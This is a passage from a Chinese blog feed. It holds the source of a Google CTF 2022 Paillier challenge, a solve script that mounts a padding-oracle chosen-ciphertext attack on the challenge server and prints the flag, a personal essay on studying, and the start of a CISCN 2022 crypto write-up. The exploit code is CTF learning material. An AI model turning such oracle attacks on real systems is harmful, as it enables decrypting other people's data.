class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2022 Google LLC</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"># you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"># You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"># See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"># limitations under the License.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> get_prime</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Suppose gcd(p, q) = 1. Find x such that</span></span><br><span class="line"><span class="comment">#   1. 0 &lt;= x &lt; p * q, and</span></span><br><span class="line"><span class="comment">#   2. x = a (mod p), and</span></span><br><span class="line"><span class="comment">#   3. x = b (mod q).</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span>(<span class="params">a, b, p, q</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a*<span class="built_in">pow</span>(q, -<span class="number">1</span>, p)*q + b*<span class="built_in">pow</span>(p, -<span class="number">1</span>, q)*p) % (p*q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x-<span class="number">1</span>) // n</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Paillier</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        p = get_prime(<span class="number">1024</span>)</span><br><span class="line">        q = get_prime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">        n = p * q</span><br><span class="line">        λ = (p-<span class="number">1</span>) * (q-<span class="number">1</span>) // math.gcd(p-<span class="number">1</span>, q-<span class="number">1</span>) <span class="comment"># lcm(p-1, q-1)</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n-<span class="number">1</span>)</span><br><span class="line">        µ = <span class="built_in">pow</span>(L(<span class="built_in">pow</span>(g, λ, n**<span class="number">2</span>), n), -<span class="number">1</span>, n)</span><br><span class="line"></span><br><span class="line">        self.n = n</span><br><span class="line">        self.λ = λ</span><br><span class="line">        self.g = g</span><br><span class="line">        self.µ = µ</span><br><span class="line"></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.rfc-editor.org/rfc/rfc3447#section-7.2.1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        padding_size = <span class="number">2048</span>//<span class="number">8</span> - <span class="number">3</span> - <span class="built_in">len</span>(m)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> padding_size &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;message too long&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        random_padding = <span class="string">b&#x27;\0&#x27;</span> * padding_size</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b&#x27;\0&#x27;</span> <span class="keyword">in</span> random_padding:</span><br><span class="line">            random_padding = os.urandom(padding_size)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;\x00\x02&#x27;</span> + random_padding + <span class="string">b&#x27;\x00&#x27;</span> + m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">if</span> m[:<span class="number">2</span>] != <span class="string">b&#x27;\x00\x02&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;decryption error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        random_padding, m = m[<span class="number">2</span>:].split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(random_padding) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;decryption error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">public_key</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (self.n, self.g)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">secret_key</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (self.λ, self.µ)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        g = self.g</span><br><span class="line">        n = self.n</span><br><span class="line"></span><br><span class="line">        m = self.pad(m)</span><br><span class="line">        m = <span class="built_in">int</span>.from_bytes(m, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r = random.randint(<span class="number">0</span>, n-<span class="number">1</span>)</span><br><span class="line">        c = <span class="built_in">pow</span>(g, m, n**<span class="number">2</span>) * <span class="built_in">pow</span>(r, n, n**<span class="number">2</span>) % n**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        λ = self.λ</span><br><span class="line">        µ = self.µ</span><br><span class="line">        n = self.n</span><br><span class="line"></span><br><span class="line">        m = L(<span class="built_in">pow</span>(c, λ, n**<span class="number">2</span>), n) * µ % n</span><br><span class="line">        m = m.to_bytes(<span class="number">2048</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.unpad(m)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fast_decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        λ = self.λ</span><br><span class="line">        µ = self.µ</span><br><span class="line">        n = self.n</span><br><span class="line">        p = self.p</span><br><span class="line">        q = self.q</span><br><span class="line"></span><br><span class="line">        rp = <span class="built_in">pow</span>(c, λ, p**<span class="number">2</span>)</span><br><span class="line">        rq = <span class="built_in">pow</span>(c, λ, q**<span class="number">2</span>)</span><br><span class="line">        r = crt(rp, rq, p**<span class="number">2</span>, q**<span class="number">2</span>)</span><br><span class="line">        m = L(r, n) * µ % n</span><br><span class="line">        m = m.to_bytes(<span class="number">2048</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.unpad(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">p</span>):</span></span><br><span class="line">    secret = os.urandom(<span class="number">2</span>)</span><br><span class="line">    secret = hashlib.sha512(secret).hexdigest().encode()</span><br><span class="line"></span><br><span class="line">    c0 = p.encrypt(secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c0 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # The secret has 16 bits of entropy.</span></span><br><span class="line">    <span class="comment"># # Hence 16 oracle calls should be sufficient, isn&#x27;t it?</span></span><br><span class="line">    <span class="comment"># for _ in range(16):</span></span><br><span class="line">    <span class="comment">#     c = int(input())</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         p.decrypt(c)</span></span><br><span class="line">    <span class="comment">#         print(&#x27;😀&#x27;)</span></span><br><span class="line">    <span class="comment">#     except:</span></span><br><span class="line">    <span class="comment">#         print(&#x27;😡&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># I decided to make it non-interactive to make this harder.</span></span><br><span class="line">    <span class="comment"># Good news: I&#x27;ll give you 25% more oracle calls to compensate, anyways.</span></span><br><span class="line">    cs = [<span class="built_in">int</span>(<span class="built_in">input</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cs:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.fast_decrypt(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;😀&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;😡&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    guess = <span class="built_in">input</span>().encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> guess != secret: <span class="keyword">raise</span> Exception(<span class="string">&#x27;incorrect guess!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      flag = f.read()</span><br><span class="line"></span><br><span class="line">    p = Paillier()</span><br><span class="line">    n, g = p.public_key()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;g = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Once is happenstance. Twice is coincidence...</span></span><br><span class="line">        <span class="comment"># Sixteen times is a recovery of the pseudorandom number generator.</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            challenge(p)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;💡&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;🏁 <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;👋&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><blockquote><p>学习参考xchgeaxeax师傅找到的<a href="https://buaq.net/go-116119.html">日语wp</a></p></blockquote><p>关于同态的选择密文攻击，时间不够，复现的话，下次一定！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> Socket</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> product(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)), repeat=<span class="number">2</span>):</span><br><span class="line">    table.append(hashlib.sha512(<span class="built_in">bytes</span>(b)).hexdigest())</span><br><span class="line"></span><br><span class="line">size = <span class="number">10</span></span><br><span class="line">basenum = <span class="built_in">int</span>(<span class="string">&quot;3000&quot;</span> * size, <span class="number">16</span>)</span><br><span class="line">basealp = <span class="built_in">int</span>(<span class="string">&quot;6100&quot;</span> * size, <span class="number">16</span>)</span><br><span class="line">one = <span class="built_in">int</span>(<span class="string">&quot;0100&quot;</span> * size, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sock = Socket(<span class="string">&quot;nc maybe-someday.2022.ctfcompetition.com 1337&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(sock.recvlineafter(<span class="string">&quot;n = &quot;</span>))</span><br><span class="line">g = <span class="built_in">int</span>(sock.recvlineafter(<span class="string">&quot;g = &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stage <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stage: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(stage + <span class="number">1</span>))</span><br><span class="line">    c0 = <span class="built_in">int</span>(sock.recvlineafter(<span class="string">&quot;c0 = &quot;</span>))</span><br><span class="line"></span><br><span class="line">    c1 = c0 * <span class="built_in">pow</span>(g, <span class="number">0xff</span> &lt;&lt; <span class="number">1024</span>, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    cs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">            cs.append(c1 * inverse(<span class="built_in">pow</span>(g, (basenum + one * i) &lt;&lt; (<span class="number">1024</span> - size * <span class="number">8</span> * <span class="number">2</span>), n ** <span class="number">2</span>), n ** <span class="number">2</span>) % (n ** <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">elif</span> i &lt;= <span class="number">0xf</span>:</span><br><span class="line">            cs.append(</span><br><span class="line">                c1 * inverse(<span class="built_in">pow</span>(g, (basealp + one * (i - <span class="number">10</span>)) &lt;&lt; (<span class="number">1024</span> - size * <span class="number">8</span> * <span class="number">2</span>), n ** <span class="number">2</span>), n ** <span class="number">2</span>) % (n ** <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cs.append(c1 * inverse(<span class="built_in">pow</span>(g, (basenum + one * (i - <span class="number">16</span>)) &lt;&lt; (<span class="number">1024</span> - size * <span class="number">8</span> * <span class="number">2</span> - <span class="number">8</span>), n ** <span class="number">2</span>), n ** <span class="number">2</span>) % (</span><br><span class="line">                        n ** <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cs:</span><br><span class="line">        sock.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">    isin = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(cs):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;😀&#x27;</span> <span class="keyword">in</span> sock.recvline().decode():</span><br><span class="line">            isin[i] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> table:</span><br><span class="line">        head = h[:<span class="number">2</span> * size][::<span class="number">2</span>]</span><br><span class="line">        head2 = h[:<span class="number">2</span> * size + <span class="number">1</span>][<span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        match = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">if</span> isin[i] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">not</span> <span class="keyword">in</span> head:</span><br><span class="line">                    match = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">in</span> head:</span><br><span class="line">                    match = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> isin[i + <span class="number">0x10</span>] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">not</span> <span class="keyword">in</span> head2:</span><br><span class="line">                    match = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">in</span> head2:</span><br><span class="line">                    match = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            sock.sendline(h)</span><br><span class="line">            line = sock.recvline().decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;💡&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;bad luck&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line">sock.interactive()</span><br><span class="line"><span class="comment"># CTF&#123;p4dd1n9_or4cl3_w1th_h0mom0rph1c_pr0p3r7y_c0m6in3d_in7o_a_w31rd_m47h_puzz1e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记二</title>
      <link href="/2022/07/12/%E6%9D%82%E8%AE%B0%E4%BA%8C/"/>
      <url>/2022/07/12/%E6%9D%82%E8%AE%B0%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-QuTZOGGb" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-QuTZOGGb"),            narrow: false,            autoplay: true,            showlrc: false,            music: {              title: "我不知道",              author: "梁博",              url: "http://cun.harry0597.com/Blog/dontknow.m4a",              pic: "https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/donknow.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><h1 id="杂记二"><a href="#杂记二" class="headerlink" title="杂记二"></a>杂记二</h1><p>这是我的第二篇杂记，颇感提笔不易。</p><p>若无触动，当下好是无心、无力去扣下键，额外花时间来写些飘渺的东西。</p><h2 id="做题家"><a href="#做题家" class="headerlink" title="做题家"></a>做题家</h2><p>因为一些事情，这词从无良的愤者笔下窜出，成了它抨击、讥讽的对象。</p><p>太荒诞了。</p><p>环境限制了发展，唯一直道是念书，反倒成了错误？合理怀疑，寻求公平成了胡闹？</p><p>大致使绝多数的我们沉默了会，也让我意识到了差异。</p><p>我无法再多说些什么，已有诸多反驳让它知道不当。</p><p>反观自身，倒是突然惘然了起来，仔细回忆，哪怕作为「做题家」，也充满遗憾。</p><h2 id="东流水"><a href="#东流水" class="headerlink" title="东流水"></a>东流水</h2><p>大概是从五、六年级开始，我意识到学习的重要性后，或主动或被动的开始了认真学习。</p><p>三年初中学习，让我以不太差的成绩进入深圳的重点中学。</p><p>但因为各种原因，高中时期我的精神状态很差很差。</p><p>我感到疲惫😫、焦躁与不安，渐渐的演变成失眠与痛苦😖。</p><p>做不到集中精神，也无法思考无法静心，恍恍惚惚中我也尝试挣扎，倒愈发膨胀、干瘪、焦虑、难过。</p><p>回忆起来，前两年像焦黑燃尽的炭灰。直到第三年，调到了「普通班」，焦虑中，我遇到了些同学、朋友，真正的感受到了高中应有的时光。</p><p>或许大家各有原因都没打好基础，高三一年都以最低的姿态仰望、坚持、挑战、学习着。那是为数不多，学习任务繁重但我却由衷感到快乐的时光。</p><p>大家最终都取得不错的成绩，但总有人不甘心的，觉得好像少了些什么，也许是三年时光上的，也或许是分数上的。</p><p>就像是我。</p><h2 id="不复回"><a href="#不复回" class="headerlink" title="不复回"></a>不复回</h2><p>这实在是奇怪，从「做题家」让我想到了这，从它那高高者的角度看，我该是小镇错题集吧，也无所谓。</p><p>因为大家都是人，没有普通不普通的，各有烦恼忧乐。</p><p>照理说大学，我该拼了命去学、去卷。</p><p>不管有无用处，死不死板，往死里学，然后取得不错的成绩，报复也似的告诉高中光阴，我也可以。</p><p>然后一脸茫然，发现学的用不上，甚至不太喜欢…</p><p>不知哪里来的勇气，在无网安学科的东北农林类学校非计算机专业，我没选择以上。</p><p>嫌大学文化课苦闷，学不到真知，便加了网安实验室，什么都没有的情况下开始了自学🤔</p><p>往密码方向走，渐渐的能做些题，成了网安协会副会长，加入了星盟安全团队…</p><p>没什么显著成绩，但我享受也乐于如此学习、挑战。</p><p>也多亏高三一年的调整，我不再犹豫不再彷徨，那段不起眼的时光拯救了我的生命。</p><p>这话乍看起来“抑云”，但我真切地告你如是。</p><h2 id="应如是"><a href="#应如是" class="headerlink" title="应如是"></a>应如是</h2><p>高考结束的假期，时隔四、五年，我又学起了Python，也神奇地看起了毛选。</p><p>说回来，计算机从小对我有莫名的引力，断断续续的学习之伴我成长。好玩嘛，也正常。</p><p>倒是毛选，是一天自觉思想太空洞了，太虚无了，见了推荐该读，便读。</p><p>实在的感受到了些东西，要我描述，也说不出。</p><p>教员在实在地思考，为中国谋事，为人民服务，体会到这对我而言也就够了。</p><p>思考是可以有价值的，是可以实在的对实际产生影响的，方向得对。</p><p>而昨天因之前通宵比赛乱了时间，头晕目眩卧床了整日，醒来恍惚间点开个视频，看到了波光粼粼的湘江流水、注视着河山的年轻时教员像…</p><p>突然有些感触。</p><p>我无比崇拜他在大人的教育下，我逐渐否认他于他人的描述里，我开始敬佩他于自我的探索中。</p><p>但他仍是他，从未改变。</p><p>或许以后再没有人将我们比作太阳，真心认为我们是希望了。</p><p>哪怕更多的声音是希望剥削压榨干净，还要给你洗脑，告诉你说九九六是福报，抨击你是普通人里的做题家…</p><p>我也得告诉你，红旗是红色的</p><p>哪怕我是色盲</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2022·Crypto</title>
      <link href="/2022/07/07/CISCN2022%C2%B7Crypto/"/>
      <url>/2022/07/07/CISCN2022%C2%B7Crypto/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="电台签到"><a href="#电台签到" class="headerlink" title="电台签到"></a>电台签到</h3><p>题目给了明文、密钥本，需要算出密文且发送出去</p><p>根据微信里公众号提示，找到密码本，进行模10运算，得到：</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220529190529555.png" alt="签到"></p><p>也根据微信里提示，先用BurpSuit抓包发s,然后修改再发上面的数字，即：</p><ul><li><p><code>GET /send?msg=sJ HTTP/1.1</code></p></li><li><p><code>GET /send?msg=2975115315066710252297245914J HTTP/1.1</code></p></li></ul><h3 id="ISO-9798-2（未解）"><a href="#ISO-9798-2（未解）" class="headerlink" title="ISO-9798-2（未解）"></a>ISO-9798-2（未解）</h3><p>没有源码文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b</span>&#x27;sha<span class="number">256</span>(XXXX+tbEA<span class="number">66</span>kfcvrpWVf<span class="number">7</span>) == ffde<span class="number">1</span>acf<span class="number">2</span>b<span class="number">63699</span>d<span class="number">40134576</span>ad<span class="number">264</span>b<span class="number">709</span>da<span class="number">89</span>e<span class="number">02</span>cfdc<span class="number">8558</span>e<span class="number">57</span>ff<span class="number">3</span>f<span class="number">24</span>fc<span class="number">36</span>fc<span class="number">5</span>\n&#x27;</span><br><span class="line"><span class="attribute">b</span>&#x27;Give me XXXX: &#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">b</span>&#x27;[Server]: Please send 